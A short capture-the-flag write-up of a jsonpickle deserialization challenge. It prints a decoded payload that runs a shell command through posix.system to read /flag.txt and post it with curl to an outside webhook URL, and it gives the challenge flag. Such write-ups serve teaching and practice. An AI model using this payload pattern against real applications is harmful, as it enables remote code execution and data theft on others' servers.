# Another one pickles the dust writeup

Well, our first purpose is to find out why we are logging in as a guest, so let's check the cookies values in BurpSuite after loading the 
page:

![who(0)](https://user-images.githubusercontent.com/57829161/78892298-d2844b80-7a71-11ea-8017-689109b63f6e.png)

![who(1)](https://user-images.githubusercontent.com/57829161/78892307-d57f3c00-7a71-11ea-97ab-b548d37770e4.png)

![who(2)](https://user-images.githubusercontent.com/57829161/78892315-d7e19600-7a71-11ea-9add-c673bc5eb5ff.png)

Now all that we need to do is to perform the jsonpickle injection into the py/object parameter:
(check the ```get_payload.py``` script - the idea is to execute the shell on the server, read the ```flag.txt``` file and send 
it to our controlled webhook):

![who(3)](https://user-images.githubusercontent.com/57829161/78892319-dadc8680-7a71-11ea-83ee-ca199c043e8f.png)

the decoded payload looks like:
```
{"py/reduce": [{"py/function": "posix.system"}, {"py/tuple": ["curl -d $(cat /flag.txt) https://webhook.site/cf4e76ba-ad0b-4c72-a914-ffbd76c67f16"]}]}
```

![who(flag)](https://user-images.githubusercontent.com/57829161/78892324-dca64a00-7a71-11ea-825b-4b4ea29c3be4.png)

Flag: `SPR{Y0U_JUST_H4CK3D_JSONPICKLE}`
